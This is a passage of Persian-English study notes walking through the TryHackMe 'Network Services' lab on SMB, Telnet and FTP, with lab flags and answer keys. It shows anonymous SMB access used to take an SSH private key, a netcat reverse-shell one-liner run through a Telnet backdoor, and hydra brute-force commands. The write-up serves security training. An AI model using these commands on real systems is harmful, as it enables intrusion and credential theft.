---
Episode: E55 to E57
Date: 2024-07-16
Is Finished?: true
Practice Primary: 
Practice Secondary: 
Time: 45:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E50 to E54 - (Pentesting Methodology - Part 2)]]"
Next Episode: "[[E58 to E61 - (Setup Hack The Box & Hack Some Machines)]]"
---
-------
## E55 to E57 - (SMB, Telnet & FTP Exploitation)
- [SMB Exploitation - E57](#SMB%20Exploitation%20-%20E57)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Whats SMB(Server Message Block)?](#Whats%20SMB(Server%20Message%20Block)?)
		- [SMB Scanning](#SMB%20Scanning)
		- [SMB Enumerating](#SMB%20Enumerating)
			- [Way 1 - `enum4linux`](#Way%201%20-%20%60enum4linux%60)
			- [Way 2 - Nmap Script `smb-os-discovery.nse`](#Way%202%20-%20Nmap%20Script%20%60smb-os-discovery.nse%60)
		- [SMB Exploitation - `smbclient`](#SMB%20Exploitation%20-%20%60smbclient%60)
	- [Practical Demo](#Practical%20Demo)
		- [TASK 1 - Get Connected](#TASK%201%20-%20Get%20Connected)
		- [TASK 2 - Understanding SMB](#TASK%202%20-%20Understanding%20SMB)
		- [TASK 3 - Enumerating SMB](#TASK%203%20-%20Enumerating%20SMB)
		- [TASK 4 - Exploitation SMB](#TASK%204%20-%20Exploitation%20SMB)
- [Telnet Exploitation - E56](#Telnet%20Exploitation%20-%20E56)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is Telnet?](#What%20is%20Telnet?)
		- [Established Telnet Connection](#Established%20Telnet%20Connection)
		- [Telnet Enumeration & Scanning](#Telnet%20Enumeration%20&%20Scanning)
	- [Practical Demo](#Practical%20Demo)
		- [TASK 5 - Understanding Telnet](#TASK%205%20-%20Understanding%20Telnet)
		- [TASK 6 - Enumerating Telnet](#TASK%206%20-%20Enumerating%20Telnet)
- [FTP Exploitation - E55](#FTP%20Exploitation%20-%20E55)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is FTP(File Transfer Protocol)?](#What%20is%20FTP(File%20Transfer%20Protocol)?)
		- [FTP Enumeration](#FTP%20Enumeration)
		- [FTP Exploit with `hydra` in Bruteforce](#FTP%20Exploit%20with%20%60hydra%60%20in%20Bruteforce)
	- [Practical Demo](#Practical%20Demo)
		- [TASK 8 - FTP](#TASK%208%20-%20FTP)
		- [TASK 9 - Enumerating FTP](#TASK%209%20-%20Enumerating%20FTP)
		- [TASK 10 - Exploitation FTP](#TASK%2010%20-%20Exploitation%20FTP)
-----
### THY Room Address
برای تمرین مباحث این جلسه از آزمایشگاه Try Hack Me و اتاق Network Services با آدرس زیر استفاده میکنیم.
- **ROOM** => **Network Services**:
	- https://tryhackme.com/room/networkservices
		- ![[Pasted image 20240716165056.png]]
### SMB Exploitation - E57
#### Definition & Instruction
##### Whats SMB?
- **SMB(Server Message Block)**: `tcp/445`
- یک پروتکل Client Server Communication است که برای اشتراک گذاری فایل ها، پرینتر، پورت سریال و سایر منابع(API, Named Pipes, ...) در شبکه استفاده میشود.
- پروتکل SMB یک پروتکل `Response Request` است بدین معنا که برای برقراری ارتباط میان کلاینت و سرور چندین پیام باید در بین کلاینت و سرور جابجا شود.
- کلاینت SMB بر بستر `TCP/IP` به سرور SMB متصل میشود، در واقع این پروتکل بر بستر `NetBIOS over TCP/IP` کار میکند بدین معنا که اگر در Scanning و Enumerating به `NetBIOS` و یا `NETBEUI` یا `IPX/SPX` برخوردیم در واقع به پروتکل SMB برخوردیم.
	- ![[Pasted image 20240717163908.png]]
- پس از برقراری ارتباط کلاینت و سرور SMB، کلاینت با اجرای کامند های SMB میتواند به فایل ها یا منابع اشتراکی دسترسی بگیرد.
- در سیستم های لینوکسی این پروتکل `SMB` نام دارد اما در سیستم های ویندوزی این پروتکل `Samba` نامیده میشود. 
- همچنین در ماشین های ویندوزی بر روی `tcp/445` که پورت SMB میباشد، سرویس `microsoft-ds` فعال است
- برای مطالعه بیشتر  کافیست عبارات `RFC1001` یا `RFC1002` را در اینترنت جستجو کنید.
- *اسلاید*:
	- ![[Pasted image 20240717164211.png]]
##### SMB Scanning
برای اسکن این پروتکل و بدست آوردن اطلاعات از SMB میتوانیم از اسکنر Nmap با فلگ های زیر استفاده کنیم >> 
	![[Pasted image 20240716163407.png]]
```sh 
nmap -sS -T4 10.10.15.16
```
##### SMB Enumerating
###### Way 1 - `enum4linux`
- برای Enumerate کردن پروتکل SMB در ویندوز و لینوکس از ابزاری بنام `enum4linux` استفاده میکنیم. 
- این ابزار در واقع نوعی Wrapper است که تمام بسته های SAMBA را برمیدارد و سپس اطلاعات مفید در مورد تارگت را از درون این بسته ها استخراج میکند. 
- این ابزار بصورت پیشفرض بر روی Kali، Parrot نصب است.
*این ابزار اطلاعات زیر را از تارگت بدست می آورد*:
- Target Machine Usernames
	- ![[Pasted image 20240716171829.png]]
- Workgroups and Domain Names
	- ![[Pasted image 20240716171840.png]]
- Target Shares
	- ![[Pasted image 20240716171917.png]]
*برای استفاده از این ابزار به شکل زیر عمل میکنیم:*
```sh
enum4linux -a 10.10.50.26
#------#------#
-a => 'Get all information about target'
```
- *اسلاید*
	![[Pasted image 20240716164229.png]]
###### Way 2 - Nmap Script `smb-os-discovery.nse`
- برای Enumerate کردن پروتکل SMB میتوانیم از اسکریپت Nmap به نام `smb-os-discovery` استفاده کنیم. این اسکریپت میتواند اطلاعات زیر را از ماشین تارگت استخراج کند:
	- Open Ports
	- Target OS
	- Computer Name
	- Computer NetBIOS
	- Domain Name & FQDN
	- System Time
		- ![[Pasted image 20240716172854.png]]
```sh
sudo nmap --script smb-os-discovery.nse 10.10.50.26
```
	![[Pasted image 20240716164637.png]]
این اسکریپت اطلاعات کاملی را از OS تارگت و همچنین پروتکل SMB شامل `NetBIOS` را برای ما استخراج میکند:
	![[Pasted image 20240716164623.png]]
##### SMB Exploitation - `smbclient`
برای گرفتن دسترسی به سرور SMB و فایل های اشتراکی و یا سایر منابع اشتراک گذاری شده، میتوانیم از `smbclient` استفاده کنیم، هنگامیکه با `smbclient` به سرور متصل میشویم میتوانیم تمام کامندهای SMB را بر روی سرور اجرا کنیم.
- *استفاده از این ابزار به نحو زیر میباشد:*
```sh
smbclient -L 
smbclient //10.10.50.26/share "Access to share folder on 10.10.50.26"
smbclient //10.10.10.2/share -U davoodya -p 12945
#-----#-----#
-L 'Access to All Shares'
-U 'specify Username'
-p 'Specify Password'
```
	![[Pasted image 20240716164926.png]]
#### Practical Demo
##### TASK 1 - Get Connected
به آزمایشگاه Try Hack Me و سپس روم Network Services میرویم و Join Room میشویم. سپس برای استارت Room از Kali Linux استفاده میکنیم:
	![[Pasted image 20240716165318.png]]
این TASK 1 سوال خاصی ندارد و فقط میگوید ماشین را روشن کنید و به آن متصل شوید.
##### TASK 2 - Understanding SMB
0. *TASK 2 - Q_&_A*
	1. *سوال اول*:
		1. What does SMB stand for? `server message block`
	2. *سوال دوم*:
		1. What Type of Protocol is SMB? `response-request`
	3. *سوال سوم*:
		1. What do client connect to server using? `tcp/ip`
	4. *سوال چهارم*:
		1. What systems does samba Run on? `Unix`
##### TASK 3 - Enumerating SMB
0. *Scanning using `nmap`*
	1. ابتدا ماشین TASK3 را Start میکنیم. سپس در اولین قدم باید تارگت را بوسیله Nmap اسکن کنیم تا بتوانیم اطلاعات مورد نیاز را از این پروتکل بیرون بکشیم. برای اینکار آیپی تارگت را بدمیداریم و به ماشین Kali در VMWare میرویم.
	2. *اسکن اول:* اسکن آسیب پذیری و پورت ها
		1. `nmap -sS -p- 10.10.50.26`
		2. `sudo nmap -sS -T4 --script vuln 10.10.50.26`
	3. در این اسکن متوجه شدیم که سه پورت `22, 139, 445` در ماشین تارگت باز است.
	4. همچنین سرویس SMB بر روی دو پورت `139/445` فعال است.
	5. همچنین مشاهده کردیم که ماشین ویندوزی از سرویس `regsvc` استفاده میکند که با استفاده از این آسیب پذیری میتوانیم به ماشین ویندوزی حمله DOS را انجام دهیم.
1. *Enumerating using `enum4linux`*
	1. در مرحله بعدی با استفاده از `enum4linux` سعی میکنیم اطلاعات این سرویس را از ماشین تارگت استخراج کنیم.
	2. `enum4linux -a 10.10.50.26`
		1. ![[Pasted image 20240716171553.png]]
	3. بوسیله `enum4linux` اطلاعات Username, Workgroup و Share های ماشین ویندوزی تارگت را بدست میاوریم:
		1. ![[Pasted image 20240716172106.png]]
		2. ![[Pasted image 20240716172110.png]]
		3. ![[Pasted image 20240716172116.png]]
	4. نام Workgroup و همچنین یک Profiles در قسمت Share را برمیداریم تا جواب سوالات را بدهیم.
2. *Enumerating using `smb-os-discovery.nse`*
	1. بوسیله این اسکریپت nmap هم میتوانیم یک Enumerating مفید و مختصر از ماشین تارگت انجام دهیم.
	2. `sudo nmap --script smb-os-discovery.nse 10.10.50.26`
	3. در نتیجه اسکن، Computer Name، OS Version و همچنین NetBIOS تارگت ویندوزی را بدست آوردیم.
	4. نام کامپیوتر، ورژن سیستم عامل را بر میداریم تا جواب سوالات TASK را بدهیم.
3. *TASK 3 - Q_&_A*
	1. *سوال اول*:
		1. Conduct nmap scanning, How many ports open? `3`
	2. *سوال دوم*:
		1. Whats Ports SMB running on? `139/445`
	3. *سوال سوم*:
		1. Conduct enumerate using enum4linux, what is the workgroup name of target? `WORKGROUP`
	4. *سوال چهارم*:
		1. Whats Computer Name? `POLOSMB`
	5. *سوال پنجم*:
		1. Whats Operation System version is running? `6.1`
	6. *سوال ششم*:
		1. Whats Share sticks out as standing we might want to investigate? `profiles`
		2. هنگام Enumerate با enum4liunx در Share های تارگت به چه چیزی برخوردید که احتمال میدهید بتوان از آن برای تحقیقات استفاده کرد؟ `profiles`
-----
```sh
sudo nmap -sS -T4 --script vuln 10.10.50.26 #Vulnerability scanning
enum4linux -a 10.10.50.26
sudo nmap --script smb-os-discovery.nse 10.10.50.26
```
##### TASK 4 - Exploitation SMB
0. *Exploitation Shares(profiles)*
	1. حال که Share های درون ماشین تارگت را بدست آوردیم میتوانیم بهره برداری را شروع کنیم و با استفاده از `smbclient` به Share های تارگت دسترسی بگیریم. در اینجا میخواهیم به Share بنام `profiles` که در مرحله Enumerate بوسیله `enum4linux` بدست آوردیم، دسترسی بگیریم.
	2. `smbclient //10.10.10.2/profiles` Leave Password as Blank
		1. ![[Pasted image 20240716174741.png]]
	3. *SMB Commands*:
		1. حال میتوانیم کامند های SMB را در ماشین تارگت اجرا کنیم.
		2. `ls`
			1. کامند را اجرا میکنیم تا ببینیم فایل مهمی هست که بتوانیم از آن استفاده کنیم. 
			2. یک فایل بنام `Working From Home Information.txt` وجود دارد که به نظر میرسد فایلی مهم و جالب است.
		3. `cat Working From Home Information.txt`
			1. این فایل را نمیتوانیم بوسیله CAT باز کنیم و برای باز کردن میتوانیم از `more` استفاده کنیم.
		4. `more Working From Home Information.txt`
			1. با باز کردن فایل متوجه میشویم که فایل نامه ای از John Cactus به James است که James مدیر دپارتمان میباشد.
			2. همچنین متوجه شدیم که سرویس SSH برای John Cactus پیکربندی شده است، در نتیجه فولدر `.ssh` در ماشین تارگت مهم است.
				1. ![[Pasted image 20240716175851.png]]
		5. `cd .ssh`
			1. در اینجا میتوانیم کلید های مورد استفاده را مشاهده کنیم که کلید `id_rsa` بدرد ما میخورد.
		6. `get id_rsa`
				1. حال کلید را دانلود میکنیم تا بتوانیم به ماشین تارگت با استفاده از این کلید بر بستر SSH متصل شویم.
1. *Connect to Target using `ssh`*
	1. حال که کلید SSH را بر روی ماشین لوکال دانلود کردیم میتوانیم به ماشین تارگت بر بستر SSH متصل شویم.
	2. برای اینکار ابتدا باید مجوز کلید را با `chmod` صادر کنیم و سپس میتوانیم فایل کلید را باز کنیم:
	3. `sudo chmod 600 id_rsa ; sudo cat id_rsa`
		1. ![[Pasted image 20240716180448.png]]
	4. حال میتوانیم به ماشین تارگت بوسیله `ssh -i id-rsa cactus@10.10..50.26` متصل شویم.
		1. `ssh -i id_rsa cactus@10.10..50.26`
			1. ![[Pasted image 20240716180650.png]]
	5. حال به ماشین تارگت بوسیله ssh متصل شدیم. کافیست فایل های ماشین را لیست کنیم و سپس `smb.txt` را باز کنیم تا مقدار فلگ را بدست بیاوریم.
		1. `THM{smb_is_fun_eh?}`
3. *TASK 2 - Q_&_A*
	1. *سوال اول*:
		1. Correct Syntax for `smclient` connect to 10.10.10.2 and `Secret` share using `suite` user? `smbclient //10.10.10.2/secret -U suit`
	2. *سوال دوم*:
		1. Does the share anonymous access? `Y`
	3. *سوال سوم*:
		1. Whats interesting Document or Valuable Information in target files. Who Can Assume this profile belongs to? `John Cactus`
		2. میگوید در فایل های ماشین تارگت چرخی بزنید تا به اطلاعات ارزشمندی برسید و متوجه شوید نام کسی که این Share را برای او گذاشته اند چیست؟ `John Cactus`
	4. *سوال چهارم*:
		1. Whats Services configured to allow him(John Cactus)? `ssh`
	5. *سوال پنجم*:
		1. What Directory in share should we look in ? `.ssh`
	6. *سوال ششم*:
		1. Which Keys most useful to us in `.ssh` directory? `id_rsa`
	7. *سوال هفتم*:
		1. بوسیله سرویس `ssh` و یوزرنیم `Cactus` و کلید` id_rsa` بدست آمده به ماشین تارگت بر بستر ssh متصل شویم و فایل `smb.txt` درون ماشین تارگت را باز میکنیم تا فلگ را بدست بیاوریم و مقدار آنرا در جواب سوال وارد کنید:
			1. `THM{smb_is_fun_eh?}`
-----
```sh
smbclient //10.10.10.2/profiles
'Paswword for [WORKGROUP\root]' #Leave it blank
ls
cat Working From Home Information.txt "don't work"
more Working From Home Information.txt
cd .ssh
get id_rsa
```
----
```sh terminal-2
sudo chmod 600 id_rsa
sudo cat id_rsa
ssh -i id_rsa cactus@10.10..50.26
```
### Telnet Exploitation - E56
#### Definition & Instruction
##### What is Telnet?
- **Telnet(Telecommunication Network)** - `tcp/23`
- پروتکل Telnet یک *Application Protocol* است. کلاینت Telnet با متصل شدن به هاستی که سرور Telnet در آن راه اندازی شده است میتواند کامند های Telnet را بر روی آن ماشین بصورت Remote اجرا کند.
- در واقع Client Telnet کانکشنی را به سمت Server Telnet برقرار میکند و در صورتیکه Authentication با موفقیت انجام شود، یک Virtual Terminal از ماشین سرور در اختیار کلاینت telnet قرار میدهد که کلاینت میتواند تمام کامند های Bash را در آن V-Terminal اجرا کند.
- از ضعف های امنیتی Telnet این است که اطلاعات بصورت Plain Text بین کلاینت و سرور ارسال میشوند و در واقع هیچ رمزنگاری بر روی داده های رد و بدل شده میان کلاینت و سرور صورت نمیگیرد.
- به همین دلیل و برای برطرف کردن این مشکل امنیتی، پروتکل SSH عرضه شد که دقیقا مانند Telnet کار میکند با این تفاوت که داده های رد و بدل شده بین کلاینت و سرور Encrypted میشوند.
- *اسلاید*:
	- ![[Pasted image 20240713185114.png]]
##### Established Telnet Connection
از کانکشن های Telnet در کار گذاشتن Backdoor ها بسیار استفاده میشود. برای برقراری ارتباط Telnet باید به نحو زیر عمل کنیم >>
	![[Pasted image 20240713190430.png]]
```sh
--------"Syntax"--------
telnet $IP $PORT

--------"Example"--------
telnet 192.168.10.1 12923
```
##### Telnet Enumeration & Scanning
- از اسکنر Nmap برای بدست آوردن اطلاعات سرویس Telnet میتوانیم استفاده کنیم. برای اینکار باید به نحو زیر عمل کنیم >>
	![[Pasted image 20240713185502.png]]
- در واقع برای اسکن Telnet بصورت پیشفرض باید پورت 23 را اسکن کنیم که اینکار را با کامند زیر انجام میدهیم:
	1. `nmap -sS -T4 -p23 10.10.50.26`
1. اما بدلیل اینکه ممکن است پورت پیشفرض سرویس توسط ادمین عوض شده باشد، در اینصورت و در روش استاندارد باید تمام پورت های ماشین تارگت را اسکن کنیم که اینکار را با اضافه کردن فلگ `-p-` به کامند مانند زیر انجام میدهیم:
	1. `nmap -sS -T4 -p- 10.10.50.26`
		1. برای انجام اسکن با سرعت بالا
	2. `nmap -sS -sV -p- -O 10.10.50.26`
		1. این اسکن زمان بیشتری میگیرد اما دقت و جزیات بیشتری دارد.
-----
```sh
nmap -sS -p23 10.10.50.26 #Only scan FTP-23 Port
nmap -sS -T4 -p- 10.10.50.26 # Way 1- Quick Scan all ports
nmap -sS -sV -p- -O 10.10.50.26 #Way 2 - Accurate Scan all ports
```
#### Practical Demo
##### TASK 5 - Understanding Telnet
0. *TASK 5 Q_&_A*
	1. *سوال اول*
		1. Whats Telnet? `application protocol`
	2. *سوال دوم*
		1. Whats has slowly replaced Telnet? `ssh`
	3. *سوال سوم*
		1. How would you connect a telnet server with the IP 10.10.10.3 on port 23?
		2. `telnet 10.10.10.3 23` or `telnet 10.10.10.3`
	4. *سوال چهارم*
		1. Whats Lack of Telnet? `encryption`
	5. تصویر
		1. ![[Pasted image 20240713191337.png]]
##### TASK 6 - Enumerating Telnet
0. *Scanning Target*
	1. `sudo nmap -sS -sV -O 10.10.5.166` OS, Services Version & Vulnerability Scanning - *Ports under 1000*
		1. `-sS` TCP Syn Scan(Hidden Scan)
		2. `-sV` Services Version Detection
		3. `-O` OS Detection
		4. Results
			1. در این اسکن اطلاعات بدر بخوری را نیافتیم. در واقع هر 1000 پورت ابتدایی Closed بودند. بنابراین باید تمام پورت ها را اسکن کنیم.
		5. Image
			1. ![[Pasted image 20240713193341.png]]
	2. `sudo nmap -sS -sV -O -p- 10.10.5.166` OS, Services & Version Scanning - *All Ports*
		1. هنگامیکه در پورت های زیر 1000  پورتی Open پیدا نکریم باید تمام 65535 پورت را اسکن کنیم تا یک پورت Open را برای نفوذ پیدا کنیم.
		2. در نتیجه اسکن پورت `8012` را پیدا کردیم که Open است.
			1. ![[Pasted image 20240713194310.png]]
		3. همچنین در نتیجه اسکن مشاهده کردیم که یک اسکریپت `Backdoor` هم در ماشین تارگت کار گذاشته شده است.
			1. ![[Pasted image 20240713194359.png]]
		4. بصورت استاندارد نام Username که این Backdoor را کار گذاشته را هم برمیداریم. در واقع بدست آوردن یوزر نیم های یک ماشین از مهمترین مراحل Enumerate و Info Gathering میباشد. در اینجا یوزرنیم `SKIDY` نام دارد:
			1. ![[Pasted image 20240713195016.png]]
1. *Established Telent Connection with Backdoor on Target machine*
	1. گفتیم که اکثرا برای متصل شدن به Backdoor از سرویس Telnet استفاده میشود. در اینجا هم در اسکن متوجه شدیم که Backdoor بر روی `tcp/8012` کار گذاشته شده است. بنابراین با استفاده از کامند زیر میتوانیم به Backdoor کار گذاشته شده متصل شویم:
	2. `telnet 10.10.5.166 8012`
		1. ![[Pasted image 20240713200011.png]]
	3. **نکته**: اگر در اتصال به Backdoor در این مرحله به مشکل برخوردیم، باید آیپی Kali را بررسی کنیم و بر روی آیپی با رنج آیپی ماشین تارگت تنظیم کنیم. مثلا در سناریو ما >>
	4. `target ip: 10.10.5.166/16` => 10.10.5.166/255.255.0.0
	5. `Kali IP shoud be 10.8.x.x/16` => 10.8.64.134/255.255.0.0
		1. ![[Pasted image 20240713195756.png]]
	6. همچنین میتوانیم از OpenVPN و برقراری تانل هم برای متصل شدن به این ماشین و سپس Backdoor درون آن استفاده کنیم.
2. *Listening Telnet Communications with tcpdump on Kali*
	1. حال که به ماشین تارگت متصل شده ایم میتوانیم کامند های مختلفی را بر روی ماشین تارگت اجرا کنیم. در اولین قدم یک شنود `tcpdump` راه اندازی میکنیم و از ماشین تارگت Kali را Ping میگیریم.
	2. در واقع اگر الان `ifconfig` را در Kali اجرا کنیم میتوانیم مشاهده کنیم که اینترفیس جدیدی بنام `tun0` اضافه شده است که از طریق آن به Backdoor در ماشین تارگت متصل شده ایم. حال میخواهیم از طریق این اینترفیس شنود بسته های icmp را راه اندازی کنیم >>
	3. `sudo tcpdump ip proto \\icmp -i tun0`
		1. ![[Pasted image 20240713200442.png]]
	4. این کامند IP, Protocol تمام بسته های ICMP را شنود میکند. در واقع هر کامند `ping` که در کانکشن Telnet تایپ شود را شنود میکند. 
	5. کافیست به ترمینال که کانکشن Telnet در آن بود باز گردیم و در telnet از ماشین تارگت، اینترفیس `tun0` در `kali` را پینگ بگیریم تا بتوانیم نتیجه شنود را در ترمینال دوم که در حال tcpdump Listening است مشاهده کنیم:
		1. `telnet 10.10.5.166 8012`
		2. `telnet> .RUN ping 10.8.64.134 -c 1`
			1. ![[Pasted image 20240713201318.png]]
		3. Now go Back in Terminal 2 - `tcpdump listening results`
			1. ![[Pasted image 20240713201340.png]]
3. *Generate Reverse Shell Payload using `msfvenom`*
	0. در این مرحله باید با استفاده از `msfvenom` یک Payload ایجاد کنیم. در این payload برقراری shell بوسیله کامند `netcat` انجام میشود و ابزار `msfvenom` این Payload را Encrypted میکند.
	1. *قدم اول* باید تمام Payload ها که برای `Netcat` هستند را لیست کنیم >>
		1. `msfvenom -l payloads | grep netcat`
			1. ![[Pasted image 20240713202054.png]]
		2. سپس باید Payload مناسب را انتخاب کنیم که در اینجا میخواهیم از `cmd/unix/reverse_snetcat` استفاده کنیم.
	2. *قدم دوم* پس از یافتن و انتخاب Payload باید Options های آنرا تنظیم کنیم و Payload را تولید کنیم >>
		1. `msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444`
			1. ![[Pasted image 20240713202405.png]]
		2. حال Payload با موفقیت تولید و کافیست کامند های Payload را کپی کنیم:
			1. `mkfifo /tmp/msnht; nc 10.8.64.134 444 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht`
				1. ![[Pasted image 20240713202447.png]]
	3. *قدم سوم* حال باید ماشین Kali را به حالت Listening Netcat ببریم >> 
		1. دقت کنید که باید ماشین در پورتی به حالت Listening ببریم که در  Payload در `LPORT` مشخص کردیم.
		2. `nc -lnvp 444`
			1. ![[Pasted image 20240713202739.png]]
		3. ترمینال را Minimize میکنیم تا payload را از طریق backdoor در ماشین تارگت اجرا کنیم.
	4. *قدم چهارم* حال بابد Payload را از طریق backdoor در ماشین تارگت اجرا کنیم >>
		1. `telnet 10.10.174.31 8012`
		2. `.RUN mkfifo /tmp/msnht; nc 10.8.64.134 444 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht`
		3. با اجرای Payload، در ترمینال اول که Netcat در حالت Listening بود میتواند به شل ماشین تارگت دسترسی بگیرد و در واقع هر کامندی اجرا کند در ماشین تارگت از طریق backdoor اجرا میشود.
			1. ![[Pasted image 20240713203541.png]]
	5. *قدم پنجم*حال در ترمینال در حال شنود Netcat(ترمینال دوم) که پس از اجرای Payload به Shell Target تغییر پیدا کرده است، در واقع یک Reverse Shell از ماشین تارگت از طریق اجرای Payload در  Backdoor، در ترمینال دوم برای ما در دسترس است >>
		1. در این مرحله باید فلگ مرحله را پیدا کنیم. کافیست از فایل های درون ماشین تارگت `ls` بگیریم و سپس فایل مورد نظر را باز میکنیم و مقدار فلگ را کپی کنیم تا در جواب سوالات بنویسیم:
			1. ![[Pasted image 20240713204050.png]]
	6. پس از یافتن flag 🚩 برای جواب سوالا میرویم.
4. *TASK 6 Q_&_A*
	1. *سوال اول*
		1. How many port open? `1`
	2. *سوال دوم* 
		1. Whats Port? `8012`
	3. *سوال سوم*
		1. Whats Protocol of Open Port? `tcp`
	4. *سوال چهارم*
		1. Rerun nmap without `-p-`, how many port open under 1000? `0`
	5. *سوال پنجم*
		1. What you think this port cloud be used for? `a backdoor`
	6. *سوال ششم*
		1. this backdoor belong to? gathering possible username
	7. *سوال هفتم*
		1. Run ping on telnet via backdoor and Listening communication in Kali machine `Y`
	8. *سوال هشتم*
		1. what word does generate payload start with?  `mkfifo`
			1. ![[Pasted image 20240713204538.png]]
	9. *سوال نهم*
		1. command for listening port we selected in our payload? `nc -lnvp 444`
			1. ![[Pasted image 20240713204418.png]]
	10. *سوال دهم*
		1. Whats content of flag.txt? `THM{y0u_g0t_th3_t3ln3t_fl4g}`
			1. ![[Pasted image 20240713204241.png]]
-----
```sh Terminal 1
nmap -sS -sV -O 10.10.5.166
nmap -sS -sV -O -p- 10.10.5.166
-----
telnet 10.10.5.166 8012
telnet> .HELP
telnet> .RUN ping 10.8.64.134 -c 1 #10.8.64.134 is 'tun0' IP
"now run payload to get accessing to listening terminal on 444"
telnet> .RUN mkfifo /tmp/msnht; nc 10.8.64.134 444 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht
```
----
```sh Terminal 2
ifconfig #afte telnet connected, "tun0" now be added to network interfaces
"After Telnet Established in Terminal 1 start tcpdump Listening"
tcpdump ip proto \\icmp -i tun0
msfvenom -l payloads | grep netcat #list all payloads for netcat
msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444 #Generate Payload for netcat on Port 444
nc -lnvp 444
"Now Netcat Listening to 444 tcp port" #Wait for run payload on target
whoami
"After Payload running on Target machine, below commands run in target machine"
#root
ls
#flag.txt
```
### FTP Exploitation - E55
#### Definition & Instruction
##### What is FTP(File Transfer Protocol)?
- `FTP(File Transfer Protocol) - TCP/21`
- از پروتکل FTP(File Transfer Protocol) برای انتقال فایل در بستر Network و بصورت ریموت استفاده میشود. پروتکل FTP یک پروتکل `Client/Server` است.
- برای ارسال داده در FTP، کلاینت ابتدا کانکشنی را به سمت سرور برقرار میکند، حال سرور با بررسی Credential کلاینت و در صورت صحیح بودن Login Credential ارتباط سرور و کلاینت برقرار میشود و به اصطلاح Session مابین کلاینت و سرور تشکیل میشود.
- حال تا هنگامیکه Session بین کلاینت و سرور باز باشد، کلاینت میتواند FTP Commands هایی را بر روی سرور اجرا کند.
##### FTP Enumeration
برای کسب اطلاعات(Enumeration) از پورت 21 که مربوط به FTP است، میتوانیم از اسکنر Nmap استفاده کنیم.
	![[Pasted image 20240713160034.png]]
همچنین میدانیم برای متصل شدن به یک FTP Server در ترمینال میتوانیم از کامند زیر استفاده کنیم >>
- `ftp 192.168.110.20`
##### FTP Exploit with `hydra` in Bruteforce 
برای پیاده سازی حمله Brute Force بر روی پورت 21 FTP میتوانیم از ابزار `hydra` استفاده کنیم. در این نوع حمله فقط برای بدست آوردن مقدار پسورد Brute Force را انجام میدهیم و در واقع باید یک Username که میخواهیم پسورد آن را بدست آوریم را وارد کنیم. البته میتوان یک wordlist را برای Username ها هم در نظر گرفت.
	![[Pasted image 20240713160700.png]]
```sh
hydra -l davoodya -P /usr/share/wordlists/rockyou.txt 192.168.10.1 ftp -v
```
- در مثال بالا، حمله Brute Force with Dictionary به روتر 192.168.10.1 و پورت 21-FTP انجام میشود. این حمله برای یافتن پسورد یوزر نیم davoodya انجام میشود. در این حمله از Rockyou.txt هم به عنوان دیکشنری حمله استفاده میشود. 
- اگر بخواهیم حمله در پورت دیگری انجام شود، باید بجای `ftp` در کامند شماره پورت `12921` را وارد کنیم. در واقع از این ابزار میتوانیم برای پیاده سازی حملات Brute Force بر روی انواع سرویس ها مانند SSH, Telnet, FTP, .... میباشد.
```sh
hydra -L ./users.txt -P ./rockyou.txt 10.10.196.16 22 -v #22 is 'SSH'
```
- از ابزار های دیگر در این دسته میتوانیم به `Medusa` اشاره کنیم.
```sh
medusa --help
```
#### Practical Demo
##### TASK 8 - FTP
برای تمرین این موضوع، به آزمایشگاه Try Hack Me و روم بنام `Network Services Room` میرویم:
- https://tryhackme.com/room/networkservices
	- ![[Pasted image 20240713161903.png]]
1. *TASK 8 Questions*
	1. What Communication Model does FTP use? `client-server`
	2. Whats Standard FTP Protocol? `21`
	3. How Many Modes are FTP Connection are there? `2`
		1. ![[Pasted image 20240713162138.png]]
##### TASK 9 - Enumerating FTP
1. *Pre-Pre Lab & Machine*
	1. Start TASK 9 Machine
		1. ![[Pasted image 20240713162312.png]]
	2. Copy Machine IP 
		1. ![[Pasted image 20240713162434.png]]
	3. Power On Kali on VMWare and Open Terminal
	4. `ping MACHINEIP` => `ping 10.10.223.220` if ping ok goto next step.
		1. ![[Pasted image 20240713162600.png]]
2. *Scan 1 - Services & Port Detection*
	1. در اسکن اول اطلاعات تمام سرویس ها و پورت هایی که بر روی ماشین تارگت فعال هستند را بدست میاوریم.
	2. `sudo nmap -sS -A -T4 10.10.223.220`
		1. `-sS` TCP SYN Scan(Hidden Src from Target)
		2. `-A` Detection all services and ports in target machine
		3. `-T4` Speed UP Scan
	3. *Read Scan Results*
		1. در نتیجه اسکن میتوانیم مشاهده کنیم که پورت `21/tcp` مربوط `ftp` در State Open قرار دارد، همچنین سرویس `vsftpd 2.0.8` هم بر روی تارگت فعال است:
			1. ![[Pasted image 20240713163044.png]]
		2. یکی دیگر از مواردی که میتوانیم از آن برای نفوذ استفاده کنیم `Anonymous ftp login` است که بر روی ماشین تارگت ما هم فعال است:
			1. ![[Pasted image 20240713163348.png]]
		3. همچنین اطلاعات FTP Server که بر روی ماشین تارگت فعال است به شرح زیر است:
			1. ![[Pasted image 20240713163228.png]]
3. *Scan 2 - All Ports Detection*
	1. در اسکن دوم، تمام پورت ها را بررسی میکنیم که ببینیم آیا به غیر از FTP پورت دیگری هم باز است. این اسکن را میتوانیم به دو شکل انجام دهیم.
	2. `sudo nmap -sS 10.10.223.220` 
		1. ![[Pasted image 20240713163829.png]]
	3. `sudo nmap -p- 10.10.223.220`
		1. ![[Pasted image 20240713163842.png]]
	4. *Read Scan Results*
		1. در `TCP SYN` اسکن دیدم که 999 پورت زیر 1000 بسته هستند یعنی فقط پورت `FTP 21/tcp` باز است.
		2. در `Port Scan`  هم دقیقا نتیجه ای مانند اسکن اول `Full Scan` داشتیم.
4. *Enumerating FTP Anonymous Login*
	1. در نتیجه اسکن مشاهده کردیم که Anonymous Login به FTP Server مجاز است. بنابراین میتوانیم اینکار را انجام دهیم >>
	2. `ftp 10.10.223.220`
	3. Enter `anonymous` for `Username` and `Leave Password as Blank`
